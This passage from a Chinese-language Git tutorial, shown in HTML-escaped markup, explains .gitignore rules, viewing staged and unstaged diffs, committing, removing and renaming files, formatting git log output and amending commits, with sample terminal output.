&lt;p&gt;创建 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gitignore&lt;/code&gt; 文件来忽略日志文件，或者编译过程中创建的临时文件等。&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .gitignore

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.[oa]

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;~
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第一行表示忽略后缀名是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;o&lt;/code&gt; 或者以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a&lt;/code&gt; 的文件，第二行告诉 Git 忽略所有以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~&lt;/code&gt; 符号结尾的文件。&lt;/p&gt;

&lt;p&gt;文件 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gitignore&lt;/code&gt; 的格式规范如下：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;所有空行或者以 ＃ 开头的行都会被 Git 忽略。&lt;/li&gt;
  &lt;li&gt;可以使用标准的 glob 模式匹配。&lt;/li&gt;
  &lt;li&gt;匹配模式可以以（/）开头防止递归。&lt;/li&gt;
  &lt;li&gt;匹配模式可以以（/）结尾指定目录。&lt;/li&gt;
  &lt;li&gt;要忽略指定模式以外的文件或目录，可以在模式前加上惊叹号（!）取反。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;glob 模式是指 shell 所使用的简化了的正则表达式。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;GitHub 有一个十分详细的针对数十种项目及语言的 .gitignore 文件列表，你可以在 &lt;a href=&quot;https://github.com/github/gitignore&quot;&gt;https://github.com/github/gitignore&lt;/a&gt; 找到它.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;查看已暂存和未暂存的修改&quot;&gt;查看已暂存和未暂存的修改&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git diff&lt;/code&gt; 命令查看未暂存的文件更新了哪些部分：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git diff
diff &lt;span class=&quot;nt&quot;&gt;--git&lt;/span&gt; a/UNSTAGED b/UNSTAGED
index f3229c5..eb1ae45 100644
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; a/UNSTAGED
+++ b/UNSTAGED
@@ &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt; +1 @@
-..
+...
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;END&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;若要查看已暂存的将要提交到下次更新里的内容，可以使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git diff --cached&lt;/code&gt; 或者 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git diff --staged&lt;/code&gt;（Git &amp;gt;= 1.6.1）命令查看：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git diff &lt;span class=&quot;nt&quot;&gt;--staged&lt;/span&gt;
diff &lt;span class=&quot;nt&quot;&gt;--git&lt;/span&gt; a/NEWADD b/NEWADD
new file mode 100644
index 0000000..e69de29
diff &lt;span class=&quot;nt&quot;&gt;--git&lt;/span&gt; a/README b/README
index 0e6bdc2..e00a688 100644
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; a/README
+++ b/README
@@ &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt; +1 @@
&lt;span class=&quot;nt&quot;&gt;-my&lt;/span&gt; project.
+my project..
diff &lt;span class=&quot;nt&quot;&gt;--git&lt;/span&gt; a/UNSTAGED b/UNSTAGED
index 9c558e3..f3229c5 100644
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; a/UNSTAGED
+++ b/UNSTAGED
@@ &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt; +1 @@
-.
+..
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;END&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;还可以通过 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git difftool&lt;/code&gt; 命令使用图形化界面分析文件差异&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;提交更新&quot;&gt;提交更新&lt;/h3&gt;
&lt;p&gt;当确保修改过的文件都已暂存（通过 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git add&lt;/code&gt; 添加修改过但还未暂存的文件），就可以准备提交了。运行提交命令 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git commit&lt;/code&gt;：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git commit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;该命令会启动文本编辑器，以便输入本次提交更新的说明。编辑器会显示下面的文本信息：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
# Please enter the commit message for your changes. Lines starting
# with '#' will be ignored, and an empty message aborts the commit.
#
# On branch master
# Changes to be committed:
#       new file:   NEWADD
#       modified:   README
#       modified:   UNSTAGED
#
# Changes not staged for commit:
#       modified:   UNSTAGED
#
# Untracked files:
#       LICENSE.txt
#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;默认的提交信息会包括最后一次运行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git status&lt;/code&gt; 的输出，放在注释行里，并且开头有一空行，用来输入提交说明。另外可以使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git commit -m&lt;/code&gt; 来将提交信息和命令放在同一行进行提交：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git commit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Story 182: Fix benchmarks for speed&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;master c800db7] Story 182: Fix benchmarks &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;speed
 3 files changed, 2 insertions&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 2 deletions&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;-&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 create mode 100644 NEWADD
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;此时便完成了提交。&lt;/p&gt;

&lt;h3 id=&quot;跳过使用暂存区域&quot;&gt;跳过使用暂存区域&lt;/h3&gt;
&lt;p&gt;使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git commit -a -m&lt;/code&gt; 来跳过暂存步骤，Git 会自动把所有已经跟踪过的文件暂存起来一并提交:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git status
On branch master
Changes not staged &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;commit:
  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git add &amp;lt;file&amp;gt;...&quot;&lt;/span&gt; to update what will be committed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git restore &amp;lt;file&amp;gt;...&quot;&lt;/span&gt; to discard changes &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;working directory&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	modified:   CONTRIBUTING.md

no changes added to commit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git add&quot;&lt;/span&gt; and/or &lt;span class=&quot;s2&quot;&gt;&quot;git commit -a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git commit &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;added new benchmarks&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;master 4520c36] added new benchmarks
 1 file changed, 1 insertion&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;移除文件&quot;&gt;移除文件&lt;/h3&gt;
&lt;p&gt;要从 Git 中移除某个文件，要从已跟踪的文件清单中移除（从暂存区移除），然后提交。使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git rm&lt;/code&gt; 命令，连带从工作目录中删除指定文件，这样以后就不会出现在未跟踪文件清单中了。&lt;/p&gt;

&lt;p&gt;如果只是手动从工作目录中删除文件，运行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git status&lt;/code&gt; 时就会在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;“Changes not staged for commit”&lt;/code&gt; 部分（也就是&lt;em&gt;未暂存清单&lt;/em&gt;）看到：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rm &lt;/span&gt;PROJECTS.md
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git status
On branch master
Changes not staged &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;commit:
  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git add/rm &amp;lt;file&amp;gt;...&quot;&lt;/span&gt; to update what will be committed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git restore &amp;lt;file&amp;gt;...&quot;&lt;/span&gt; to discard changes &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;working directory&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	deleted:    PROJECTS.md

no changes added to commit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git add&quot;&lt;/span&gt; and/or &lt;span class=&quot;s2&quot;&gt;&quot;git commit -a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后需要再运行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git rm&lt;/code&gt; 操作来移除此文件，这样下次提交时，该文件就不再纳入版本管理了。&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git &lt;span class=&quot;nb&quot;&gt;rm &lt;/span&gt;PROJECTS.md
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git status
On branch master
Changes to be committed:
  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git restore --staged &amp;lt;file&amp;gt;...&quot;&lt;/span&gt; to unstage&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	deleted:    PROJECTS.md

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果删除之前，已修改过并且放入了暂存区，必须使用强制删除选项 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-f&lt;/code&gt; 。&lt;/p&gt;

&lt;p&gt;如果我们想把文件从暂存区删除，但是不想删除本地文件的话，使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--cached&lt;/code&gt; 选项：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--cached&lt;/span&gt; README
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;移动文件&quot;&gt;移动文件&lt;/h3&gt;
&lt;p&gt;要在 Git 中修改文件名，可以使用下面的命令：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git &lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;file_from file_to
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;此时查看状态信息：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git &lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;README README.md
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git status
On branch master
Changes to be committed:
  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git restore --staged &amp;lt;file&amp;gt;...&quot;&lt;/span&gt; to unstage&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	renamed:    README -&amp;gt; README.md

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;该命令相当于：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;README README.md
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git &lt;span class=&quot;nb&quot;&gt;rm &lt;/span&gt;README
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git add README.md
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;查看提交历史&quot;&gt;查看提交历史&lt;/h2&gt;
&lt;p&gt;使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git log&lt;/code&gt; 命令查看并回顾提交历史：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git log
commit ca82a6dff817ec66f44342007202690a93763949 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;HEAD -&amp;gt; master, origin/master, origin/HEAD&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Author: Scott Chacon &amp;lt;schacon@gmail.com&amp;gt;
Date:   Mon Mar 17 21:52:11 2008 &lt;span class=&quot;nt&quot;&gt;-0700&lt;/span&gt;

    changed the verison number

commit 085bb3bcb608e1e8451d4b2432f8ecbe6306e7e7
Author: Scott Chacon &amp;lt;schacon@gmail.com&amp;gt;
Date:   Sat Mar 15 16:40:33 2008 &lt;span class=&quot;nt&quot;&gt;-0700&lt;/span&gt;

    removed unnecessary &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;code

commit a11bef06a3f659402fe7563abf99ad00de2209e6
Author: Scott Chacon &amp;lt;schacon@gmail.com&amp;gt;
Date:   Sat Mar 15 10:31:28 2008 &lt;span class=&quot;nt&quot;&gt;-0700&lt;/span&gt;

    first commit
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;END&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p&lt;/code&gt; 参数，来显示每次提交的内容差异。也可以加上 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-2&lt;/code&gt; 来显示仅最近2次提交：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git log &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-2&lt;/span&gt;
commit ca82a6dff817ec66f44342007202690a93763949 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;HEAD -&amp;gt; master, origin/master, origin/HEAD&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Author: Scott Chacon &amp;lt;schacon@gmail.com&amp;gt;
Date:   Mon Mar 17 21:52:11 2008 &lt;span class=&quot;nt&quot;&gt;-0700&lt;/span&gt;

    changed the verison number

diff &lt;span class=&quot;nt&quot;&gt;--git&lt;/span&gt; a/Rakefile b/Rakefile
index a874b73..8f94139 100644
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; a/Rakefile
+++ b/Rakefile
@@ &lt;span class=&quot;nt&quot;&gt;-5&lt;/span&gt;,7 +5,7 @@ require &lt;span class=&quot;s1&quot;&gt;'rake/gempackagetask'&lt;/span&gt;
 spec &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Gem::Specification.new &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; |s|
     s.platform  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;   Gem::Platform::RUBY
     s.name      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;   &lt;span class=&quot;s2&quot;&gt;&quot;simplegit&quot;&lt;/span&gt;
-    s.version   &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;   &lt;span class=&quot;s2&quot;&gt;&quot;0.1.0&quot;&lt;/span&gt;
+    s.version   &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;   &lt;span class=&quot;s2&quot;&gt;&quot;0.1.1&quot;&lt;/span&gt;
     s.author    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;   &lt;span class=&quot;s2&quot;&gt;&quot;Scott Chacon&quot;&lt;/span&gt;
     s.email     &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;   &lt;span class=&quot;s2&quot;&gt;&quot;schacon@gmail.com&quot;&lt;/span&gt;
     s.summary   &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;   &lt;span class=&quot;s2&quot;&gt;&quot;A simple gem for using Git in Ruby code.&quot;&lt;/span&gt;

commit 085bb3bcb608e1e8451d4b2432f8ecbe6306e7e7
Author: Scott Chacon &amp;lt;schacon@gmail.com&amp;gt;
Date:   Sat Mar 15 16:40:33 2008 &lt;span class=&quot;nt&quot;&gt;-0700&lt;/span&gt;

    removed unnecessary &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;code

diff &lt;span class=&quot;nt&quot;&gt;--git&lt;/span&gt; a/lib/simplegit.rb b/lib/simplegit.rb
index a0a60ae..47c6340 100644
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; a/lib/simplegit.rb
+++ b/lib/simplegit.rb
@@ &lt;span class=&quot;nt&quot;&gt;-18&lt;/span&gt;,8 +18,3 @@ class SimpleGit
     end

 end
-
&lt;span class=&quot;nt&quot;&gt;-if&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; __FILE__
-  git &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; SimpleGit.new
-  puts git.show
&lt;span class=&quot;nt&quot;&gt;-end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--stat&lt;/code&gt; 选项，显示每次提交的简略信息：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git log &lt;span class=&quot;nt&quot;&gt;--stat&lt;/span&gt;
commit ca82a6dff817ec66f44342007202690a93763949 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;HEAD -&amp;gt; master, origin/master, origin/HEAD&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Author: Scott Chacon &amp;lt;schacon@gmail.com&amp;gt;
Date:   Mon Mar 17 21:52:11 2008 &lt;span class=&quot;nt&quot;&gt;-0700&lt;/span&gt;

    changed the verison number

 Rakefile | 2 +-
 1 file changed, 1 insertion&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 1 deletion&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;-&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

commit 085bb3bcb608e1e8451d4b2432f8ecbe6306e7e7
Author: Scott Chacon &amp;lt;schacon@gmail.com&amp;gt;
Date:   Sat Mar 15 16:40:33 2008 &lt;span class=&quot;nt&quot;&gt;-0700&lt;/span&gt;

    removed unnecessary &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;code

 lib/simplegit.rb | 5 &lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt;
 1 file changed, 5 deletions&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;-&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

commit a11bef06a3f659402fe7563abf99ad00de2209e6
Author: Scott Chacon &amp;lt;schacon@gmail.com&amp;gt;
Date:   Sat Mar 15 10:31:28 2008 &lt;span class=&quot;nt&quot;&gt;-0700&lt;/span&gt;

    first commit

 README           |  6 ++++++
 Rakefile         | 23 +++++++++++++++++++++++
 lib/simplegit.rb | 25 +++++++++++++++++++++++++
 3 files changed, 54 insertions&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;END&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--pretty=&amp;lt;&amp;gt;&lt;/code&gt; 选项来用不同的方式展示提交历史，如：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git log &lt;span class=&quot;nt&quot;&gt;--pretty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;online
ca82a6dff817ec66f44342007202690a93763949 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;HEAD -&amp;gt; master, origin/master, origin/HEAD&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; changed the verison number
085bb3bcb608e1e8451d4b2432f8ecbe6306e7e7 removed unnecessary &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;code
a11bef06a3f659402fe7563abf99ad00de2209e6 first commit
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;END&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;format&lt;/code&gt; 参数来定制显示的记录格式：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git log &lt;span class=&quot;nt&quot;&gt;--pretty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;format:&lt;span class=&quot;s2&quot;&gt;&quot;%h - %an, %ar : %s&quot;&lt;/span&gt;
ca82a6d - Scott Chacon, 12 years ago : changed the verison number
085bb3b - Scott Chacon, 12 years ago : removed unnecessary &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;code
a11bef0 - Scott Chacon, 12 years ago : first commit
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;END&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;更多选项查看 &lt;a href=&quot;https://git-scm.com/docs/pretty-formats&quot;&gt;pretty-formats&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;如果使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;online&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;format&lt;/code&gt; 选项时配合 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--graph&lt;/code&gt; 使用，会添加一些 ASCII 字符串来形象的展示分支、合并历史：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git log &lt;span class=&quot;nt&quot;&gt;--pretty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;online &lt;span class=&quot;nt&quot;&gt;--graph&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git log&lt;/code&gt; 详细参数参考 &lt;a href=&quot;https://git-scm.com/docs/git-log&quot;&gt;git-log&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;撤消操作&quot;&gt;撤消操作&lt;/h2&gt;
&lt;p&gt;有些撤消操作是不可逆的。 这是在使用 Git 的过程中，会因为操作失误而导致之前的工作丢失的少有的几个地方之一。&lt;/p&gt;

&lt;p&gt;当我们提交完成后发现漏掉了文件，或者提交信息填写错误，可以运行带有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--amend&lt;/code&gt; 选项的提交命令，重新提交。&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git commit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'initial commit'&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git add forgotten_file

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git commit &lt;span class=&quot;nt&quot;&gt;--amend&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这个命令会将暂存区的文件提交；如果暂存区没有文件（自上次提交后没有修改，如上次提交后马上执行此命令），那么快照会保持不变，只是提示修改提交信息。最终只会有一个提交，第二次提交将替代第一次提交。&lt;/p&gt;

